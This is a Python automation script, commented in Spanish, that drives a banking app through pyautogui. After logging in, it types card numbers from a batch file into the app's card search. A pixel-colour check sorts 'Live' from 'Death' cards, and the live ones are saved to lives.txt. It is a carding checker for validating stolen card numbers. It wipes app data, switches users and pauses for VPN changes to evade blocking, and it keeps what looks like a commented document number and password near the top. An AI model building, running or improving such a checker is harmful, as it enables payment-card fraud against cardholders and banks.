import pyautogui
import time 
import telegram


otras_tarjetas = 1451, 356
numero_tarj = 1454, 200 # X   Y 
buscar = 1636, 319
escape = 1893, 85
cerrar_programa = 1675,94
contra = 1510,386
cuentaFacil = 1444,483
vermas = 1845, 427
pagar_tarjeta = 1640 , 312
numdocumento = 1586,335
continuarprimero = 1642,338
clickcontra = 1569, 221
ingresar2 = 1639, 443
engranaje = 1545,17
engranajegrande = 1625,20
borrarDatos = 1481,537
menuinicio = 1529,20
borraraceptar = 1781,573
confirmarnoti = 1838,586
#43586569
#bola123
soy_cliente = 1635,894
entendido = 1636,1004
def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def abrirYcerrar_app():
	click(cerrar_programa)
	time.sleep(1.5)
	click(engranajegrande)
	time.sleep(1.3)
	click(borrarDatos)
	time.sleep(0.5)
	
	click (borraraceptar)
	time.sleep(0.5)
	#Inicio 
	click(menuinicio)
	#print("Buscando app...")
	time.sleep(1)
	a = None
	while (a is None):
		verif = "aplicativo.png"
		time.sleep(0.2)
		a = pyautogui.locateOnScreen(verif, grayscale=True, confidence=0.9)
		#time.sleep(0.5)
		#print("Verificando")
		if a == None:
			time.sleep(0.3)
	#print("Encontrado")
	click(a)

def EntraralMEnu():
	click(cuentaFacil)
	time.sleep(2)
	click(vermas)
	time.sleep(1)
	click(pagar_tarjeta)


# Entrando 
#print("Entrando")
lives = open("lives.txt","a")

print("\n")
print("*****************")
dni = input("Ingrese el DNI de la persona: ")
contraDNI= input("Ingrese la contraseña de acceso: ")
print("*****************")
print("\n")
print("Presione 'Enter' para continuar")
input()

print("Logeandose...")
time.sleep(0.5)
click(numdocumento)
pyautogui.typewrite(dni)
time.sleep(0.5)
click(continuarprimero)
time.sleep(0.5)
pyautogui.typewrite(contraDNI)
ingresar = 1632,320
click(ingresar)
time.sleep(10) # VPPPPPPPPPNNNNNNNNNNNNNNNN

activar_notificaciones = 1636,964
click(activar_notificaciones)
time.sleep(1)
confirmarnoti = 1838,586
click(confirmarnoti) # Confirmar
time.sleep(5)

EntraralMEnu()
time.sleep(4)
listado = 0
contador = 0

#print("entrnado")
try:
	with open ('./lote.txt') as texto:
		for x in texto:
			#Para abrir el programa para el reseteo
			listado += 1 # Para ver las lineas
			'''
			if contador/10 == 1:
				abrirYcerrar_app()
				time.sleep(6)
				click(contra)
				pyautogui.typewrite(contraDNI)
				time.sleep(4)
				EntraralMEnu()
				time.sleep(1.5)
			'''

			#Escribiendo
			#print("Dentro")
			#Verificador
			b = None
			contador = 0
			#print("entrnado")
			while (b is None) :
				contador += 1
				time.sleep(0.3)
				aceptar = "confirmacion.png"
				b = pyautogui.locateOnScreen(aceptar, grayscale=True, confidence=0.9)
				#print(b)
				
				if b == None:
					#print("Verificando...")
					time.sleep(0.3)
				if contador > 17:
					print("Hubo un error en el programa, reiniciando...")
					#click(engranaje)

					time.sleep(1)
					abrirYcerrar_app()
					time.sleep(10)  # VPNNNNNNNNN
					
					#Cambiar usuario:
					cambiarUSer = 1635,301
					confirUser = 1634,960
					click(cambiarUSer)
					time.sleep(1)
					click(confirUser)
					time.sleep(2)

					print("Volviendo a abrir...")

					abrirYcerrar_app()
					#print("aaaaaaaaaaaa")

					time.sleep(14)
					#Primer menu
					time.sleep(5)
					click (soy_cliente)
					time.sleep(0.8)
					click(entendido)
					time.sleep(0.5)

					#time.sleep(0.5)
					click(numdocumento)
					pyautogui.typewrite(dni)
					time.sleep(0.5)
					click(continuarprimero)
					time.sleep(0.5)
					pyautogui.typewrite(contraDNI)
					#ingresar = 1632,320
					click(ingresar)
					time.sleep(10)


					#pyautogui.typewrite(contraDNI)
					#click(ingresar2)
					#time.sleep(6)

					activar_notificaciones = 1636,964
					click(activar_notificaciones)
					time.sleep(1)
					
					click(confirmarnoti) # Confirmar # COnfirmar
					time.sleep(5)

					EntraralMEnu()
					time.sleep(1.5)
					contador = 0
					time.sleep(1.5)
					break
					#pyautogui.alert("Error ")
					#break
			#if contador  > 20:
				#break
			#print("temrinaod")
			time.sleep(0.8)
			click(otras_tarjetas)
			time.sleep(0.3)
			click(numero_tarj)
			pyautogui.typewrite(x)
			time.sleep(0.2)
			click(buscar)
			#Verificar:
			bandera = "flag"
			print("--------------------------------")
			print("Linea ", listado, " --- >  ", x.rstrip())
			#print()
		
			
			time.sleep(2)
			while True:
				while bandera == "flag":
					try:
						#Verificar desde un principio mejor:
						time.sleep(0.2)
						#print("Verificando...")
						screenshot = pyautogui.screenshot()
						#time.sleep(0.3)
						img = screenshot.getpixel((1517,168))
						#time.sleep(0.2)

						#valor = pyautogui.pixelMatchesColor(1484,159, (252,223,223)) # Rojo
						#valor2= pyautogui.pixelMatchesColor(1512,175, (212,237,252)) # Azul
						valor3 = pyautogui.pixelMatchesColor(1517,168, (218,239,224)) # Verde
						#print("hola111")
						#print(valor)
						bandera = "noflag"
					except:
						time.sleep(0.3)
						#print("hola")
						bandera = "flag"

				#print("no entre")
				#time.sleep(0.1)
				if valor3 == True: # Osea no es azul, sino blanco, encontraod!!!
					#registro.close()
					#bot.send_message(chat_id=chat_id, text = 'CVV encontrada: '+str(inicio))
					print("Live")
					lives.write(x.rstrip()) # escribir en el block
					lives.write("\n")
					time.sleep(3)
					break
				else:
					print("Death")
					break

			

			#Saliendo
			#time.sleep(1.5)
			click(escape)
			time.sleep(0.3)


except:
	print("Algo salió mal")
	lives.close()
	print("Presione 'Enter' para continuar")
	input()

print("Programa finalizado")
lives.close()
print("Presione 'Enter' para continuar")
input()